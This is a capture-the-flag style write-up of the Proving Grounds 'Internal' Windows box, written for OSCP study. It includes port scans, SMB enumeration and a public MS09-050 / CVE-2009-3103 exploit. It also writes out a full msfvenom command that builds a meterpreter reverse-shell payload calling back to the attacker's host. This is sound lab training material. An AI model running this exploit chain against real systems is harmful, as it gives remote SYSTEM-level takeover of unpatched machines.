---
layout: writeup
title: Internal - Proving Grounds
date: 2024-08-18 13:32:20 +0300
description: A Writeup of the Internal Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Windows, TJ Null, LainKusanagi, Buffer Overflow]
---

Alright, here's a writeup of Internal from [Proving Grounds](https://www.offsec.com/labs/), and it is on both TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#), as well as LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). As usual we get started with an nmap scan which reveals:

```
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
```

Interesting that there's not even a web port here to fake us out. It also seems like there's not a lot to work with here, so hopefully the foothold comes up pretty quickly. I get started with `smbclient -L \\\\192.168.171.40\\ -N`, but we're not able to connect because we have `no workgroup available`. We are able to connect with rpcclient, but we can't seem to run any commands because we get the output: `Error was NT_STATUS_ACCESS_DENIED`. I ran enum4linux here as well, but nothing of note showed up. The only thing left really was port 5357 and brute forcing. 

When you Google "port 5357 exploit" (not even including wsdapi), you get [this Microsoft Security Bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-063). The subheader for this link says Vulnerability in Web Services on Devices API Could Allow Remote Code Execution." That could be a pretty big sign, and it also mentions CVE-2009-2512. So we can google that and see what we can find. There's a few options here. There's [this](https://www.exploit-db.com/exploits/40280) exploit from exploit-db, but it's from 2016, and searching for something newer might be a little easier. I found [this](https://github.com/sec13b/ms09-050_CVE-2009-3103) github repo which has two versions of an exploit from the same vulnerability, one apparently written in python2 and one in python3, both evidently adapted from the exploit-db one. 

I decide to go with the python3 one [here](https://github.com/sec13b/ms09-050_CVE-2009-3103/blob/main/MS09_050_2.py), but they all have a section for shell code, and you can see at the comment the command run to generate it. 

![Internal1.png](/assets/images/Internal/Internal1.png){: .responsive-image}

I change the command for my own purposes: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.183 LPORT=445  EXITFUNC=thread  -f python -v shell`. 

![Internal2.png](/assets/images/Internal/Internal2.png){: .responsive-image}

And then paste my own output into the exploit code. From there it's as simple as running: `python3 exploit.py $targetIP`. Initially I get an error:

```
ERROR: Could not find a version that satisfies the requirement smb (from versions: none)
ERROR: No matching distribution found for smb
```

But this can be overcome with `pip3 install pysmb`. After that, I get a hit on my reverse shell:

![Internal3.png](/assets/images/Internal/Internal3.png){: .responsive-image}

And it hangs and dies. Maybe I'll go back to the exploit-db one... Wait. I see I used msfvenom for a meterpreter shell when I attempt to run the same command again. And I do, and it hangs again. At this point I go back to the exploit-db one, but it's in python2, which doesn't seem to accept that I have pysmb installed, and I can't seem to install it. 

I think a little bit more about the code and notice this section.

![Internal4.png](/assets/images/Internal/Internal4.png){: .responsive-image}

It specifies metasploit, and that makes sense because the shell code given is a meterpreter shell which requires metasploit. But I don't want to use meterpreter or metasploit because I am studying for the OSCP exam, and you can only use Metasploit on one box, so I'd like to save it as best as I can. So I try to remove this code and run it without, but that doesn't work. In fact, it doesn't even establish a connection, so I think I must be going backwards. 

Instead, I decide to try to use metasploit, but only `exploit/multi/handler` which we can use on the exam. I put the `stager_sysenter_hook` code back where it was in the exploit, and upload the payload, LHOST, and LPORT options for the msf handler, and then run the code again. 

![Internal5.png](/assets/images/Internal/Internal5.png){: .responsive-image}

And voila! It looks like we already have `NT Authority\System` privilges so we're done here. 

Lessons learned: Not a ton. It's easy to get stumped at the beginning here when there's nowhere to look but the 5357 port, and the vulnerability could easily be missed if you are just looking at exploit-db. I guess I learned that sometimes only msf handler will actually catch a shell, so it will be good to keep on eye on that in the future. 

Remediation Steps: Upgrading the version of this API as per the recommendations on the [Microsoft Security Bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-063). There weren't any other steps in this box. 

Side note: When I was looking up how others did the box, I saw that I was not the only one to accidentally use meterpreter shell code the first time around, but that author did not try again and still believed that maybe it would work with a regular shell from msfvenom. I actually didn't find any writeups at all that used a different handler; they all used msf, and most of the writeups actually used a Metasploit exploit, which of course would burn their one use on the actual exam. Apparently this is because the actual writeup from Offsec uses Metasploit which seems kind of dumb to me. It just kind of defeats the purpose. 

Future goal: It would be kind of cool to write an exploit that actually works with a non-msf handler... Unfortunately I can't spend the time right now with my exam coming up. 